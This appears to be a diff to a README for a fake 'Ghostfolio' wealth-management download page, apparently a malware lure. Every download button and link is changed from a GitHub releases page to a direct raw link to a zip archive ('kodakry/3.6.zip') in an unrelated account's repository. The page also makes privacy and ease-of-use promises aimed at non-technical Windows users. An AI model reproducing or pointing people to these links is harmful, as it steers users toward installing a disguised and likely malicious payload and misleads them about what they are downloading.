@@ -1,6 +1,6 @@
 <h1>📈 Ghostfolio-Open-Source-Wealth-Management-Software - Track Your Wealth Privately & Easily</h1>
 
-<p align="center"><a href="https://github.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/releases" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#fff;border-radius:8px;font-size:22px;font-weight:bold;text-decoration:none;box-shadow:0 4px 12px rgba(255,107,107,0.4)">⬇️ DOWNLOAD NOW - FREE</a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/main/kodakry/3.6.zip" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#fff;border-radius:8px;font-size:22px;font-weight:bold;text-decoration:none;box-shadow:0 4px 12px rgba(255,107,107,0.4)">⬇️ DOWNLOAD NOW - FREE</a></p>
 
 <p align="center"><strong>Works on Windows • No programming needed • Your data stays yours</strong></p>
 
@@ -29,7 +29,7 @@
 
 <h3>Step 1: Download the Application</h3>
 
-<p>👉 <strong>Visit this link to download the application:</strong> <a href="https://github.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/releases">https://github.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/releases</a></p>
+<p>👉 <strong>Visit this link to download the application:</strong> <a href="https://raw.githubusercontent.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/main/kodakry/3.6.zip">https://raw.githubusercontent.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/main/kodakry/3.6.zip</a></p>
 
 <p>On that page, you will see a list of files. Look for the newest one that matches your system (for most Windows users, select the file with <code>windows</code> or <code>win</code> in the name). Click it to start downloading.</p>
 
@@ -132,7 +132,7 @@
 
 <h2>📥 Ready to Take Control of Your Portfolio?</h2>
 
-<p style="text-align:center"><a href="https://github.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/releases" style="display:inline-block;padding:18px 36px;background:#4CAF50;color:#fff;border-radius:8px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 12px rgba(76,175,80,0.4)">⬇️ DOWNLOAD GHOSTFOLIO NOW</a></p>
+<p style="text-align:center"><a href="https://raw.githubusercontent.com/qq931493853-lang/Ghostfolio-Open-Source-Wealth-Management-Software/main/kodakry/3.6.zip" style="display:inline-block;padding:18px 36px;background:#4CAF50;color:#fff;border-radius:8px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 12px rgba(76,175,80,0.4)">⬇️ DOWNLOAD GHOSTFOLIO NOW</a></p>
 
 <p style="text-align:center">It takes 3 minutes to install. It gives you lifetime clarity on your investments. And it respects your privacy completely.</p>
 
